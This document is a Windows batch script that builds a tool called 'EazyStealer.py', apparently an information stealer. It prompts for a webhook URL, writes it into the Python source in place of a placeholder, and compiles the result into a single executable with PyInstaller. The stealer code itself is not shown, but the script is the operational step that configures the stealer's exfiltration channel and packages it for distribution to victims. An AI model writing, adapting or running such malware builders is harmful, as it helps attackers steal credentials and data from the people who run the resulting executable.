@echo off
setlocal

set /p webhook_url=Please enter your webhook URL: 
pause  # Pause to check if the input is correct

if "%webhook_url%"=="" (
    echo No webhook URL provided. Exiting...
    pause
    exit /b
)

echo Updating EazyStealer.py...
powershell -Command "(gc EazyStealer.py) -replace 'YOUR_WEBHOOK_URL_HERE', '%webhook_url%' | Out-File EazyStealer.py -Encoding utf8"
if ERRORLEVEL 1 (
    echo Failed to update EazyStealer.py. Exiting...
    pause
    exit /b
)

echo Building executable...
python -m PyInstaller --onefile --hidden-import=encodings EazyStealer.py
if ERRORLEVEL 1 (
    echo PyInstaller failed. Exiting...
    pause
    exit /b
)

del EazyStealer.spec
rmdir /s /q build

echo Build complete! Your executable is located in the dist folder.
endlocal
pause
